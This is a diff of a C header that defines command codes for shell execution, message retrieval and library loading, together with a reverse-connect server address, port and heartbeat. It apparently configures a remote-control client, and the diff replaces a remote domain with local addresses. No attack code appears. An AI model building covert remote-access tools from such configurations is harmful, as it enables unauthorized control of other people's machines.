@@ -1,5 +1,7 @@
 #pragma once
 
+// 作者：Saurik https://www.myocean.net/
+
 #define Shell_Method 100ULL
 #define Get_Last_Msg 101ULL
 #define Load_Lib 102ULL
@@ -17,9 +19,8 @@
 #define S_Port 10230
 #define NEEDDOMAIN 1
 // 服务端IP地址（反射）
-#define Server_IP "127.0.0.1"
-#define Server_Host "yetbins191.ithot.top"
-//#define Server_Host "localhost"
+#define Server_IP "192.168.199.188"
+#define Server_Host "localhost"
 // 心跳包、接收时间（毫秒）
 #define Wait_Time 5000
 // 欢迎语
